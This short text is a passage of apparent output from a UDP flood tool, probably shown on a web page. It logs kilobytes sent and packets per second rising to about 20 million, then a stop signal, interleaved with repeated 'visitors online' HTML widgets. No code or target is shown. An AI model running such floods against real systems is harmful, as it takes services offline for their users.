[UDP] Sent: 1470845 KB, Approx PPS: 1.17668e+07
[UDP] Sent: 1557072 KB, Approx PPS: 1.24566e+07
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 1636601 KB, Approx PPS: 1.30928e+07
[UDP] Sent: 1740346 KB, Approx PPS: 1.39228e+07
[UDP] Sent: 1816496 KB, Approx PPS: 1.4532e+07
[UDP] Sent: 1902240 KB, Approx PPS: 1.52179e+07
[UDP] Sent: 1982260 KB, Approx PPS: 1.58581e+07
[UDP] Sent: 2065756 KB, Approx PPS: 1.6526e+07
[UDP] Sent: 2150253 KB, Approx PPS: 1.7202e+07
[UDP] Sent: 2236673 KB, Approx PPS: 1.78934e+07
[UDP] Sent: 2318201 KB, Approx PPS: 1.85456e+07
[UDP] Sent: 2392654 KB, Approx PPS: 1.91412e+07
[UDP] Sent: 2480093 KB, Approx PPS: 1.98407e+07
[UDP] Sent: 2547655 KB, Approx PPS: 2.03812e+07
[-] STOP signal received
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="pad